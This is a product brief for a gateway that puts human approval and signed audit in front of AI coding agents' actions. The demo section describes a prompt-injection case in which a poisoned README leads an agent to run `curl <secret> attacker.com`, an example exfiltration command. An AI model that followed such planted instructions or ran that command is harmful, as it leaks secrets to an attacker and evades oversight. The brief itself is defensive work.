# Agent Governance Gateway — one-page brief

## The problem

Enterprises are rapidly adopting AI coding and agentic tools (Claude Code, ChatGPT
Enterprise/Codex, Cursor, and others). These tools are effective *because* they can access
information and act on the machine — which is exactly what makes them a governance problem
in regulated or security-sensitive environments: an agent can read files outside its remit,
write to production, run destructive shell, or be prompt-injected into exfiltrating data.
Teams increasingly require every such tool to be **human-in-the-loop**. This project is that
control layer, and it generalizes across vendors.

## The one idea

> **An AI agent having a *capability* is not the same as it having *authority*.**

A private, in-tenant model (e.g. ChatGPT Enterprise on Entra) fixes *data residency* —
prompts and code stay in your tenant. It does **not** govern what the agent *does*: reading
files outside its remit (a segregation-of-duties breach), writing to prod, running
destructive shell, or being prompt-injected into exfiltrating to an attacker host your model
gateway never sees. That is an **authorization** problem. This gateway separates capability
from authority for every agent action.

## What it is

A model-agnostic control plane that sits between any coding/agentic AI and the machine.
For **every** tool call it answers, and records the answer to, this chain:

*who is the agent · what is it trying to do · to what resource · what authority does it
have · what policy applies · does it need a human · who approved · what happened · can an
examiner prove it.*

- **Human-in-the-loop by construction.** Privileged actions are escalated to a named
  approver; the action runs *outside* the agent; the output is returned so the agent
  continues. The agent never holds the privilege.
- **One control plane, every agent.** Works with Claude Code (hooks) and any
  MCP-speaking agent — ChatGPT Enterprise/Codex, Cursor, Windsurf — through one policy, one
  approval queue, one audit chain. *A single-vendor wrapper only covers one tool; this
  governs the whole estate.*
- **Contextual, explainable authorization.** Every action gets a transparent risk score
  built from named factors (privilege, resource sensitivity, destination, reversibility,
  environment, agent trust) — never a magic number. Low risk runs silently; high risk
  needs one approver; critical needs two.
- **Examiner-grade audit.** A tamper-evident hash chain, and every approval is Ed25519-
  signed, binding *identity → action → policy → outcome* (non-repudiation).

## Why it is credible

- Directly implements a human-in-the-loop posture regulated enterprises are committing to.
- Maps control-by-control to the rules examiners cite: **SR 11-7 model risk, NYDFS Part 500,
  DORA, ISO 42001**, and regional financial-data guidelines (see
  [COMPLIANCE_MAP.md](COMPLIANCE_MAP.md)).
- Ships with an honest threat model organized by *attacker goal* and an explicit
  Trusted Computing Base ([THREAT_MODEL.md](THREAT_MODEL.md), [TCB.md](TCB.md)).
- Full test suite; the loop is proven end-to-end with a real agent.

## The 3-minute demo

1. Claude Code **and** a Codex-style agent, governed by one policy, one approval queue.
2. A privileged command → escalated with a **risk score and itemized factors** →
   approved → output returns. `sandbox explain <id>` shows the whole decision, signed.
3. **The kill-chain:** a poisoned README prompt-injects the agent into
   `curl <secret> attacker.com` → the gateway escalates on the unknown destination →
   denied. *The AI was compromised at the reasoning layer; the authorization layer held.*

See [DEMO.md](DEMO.md) to run it.
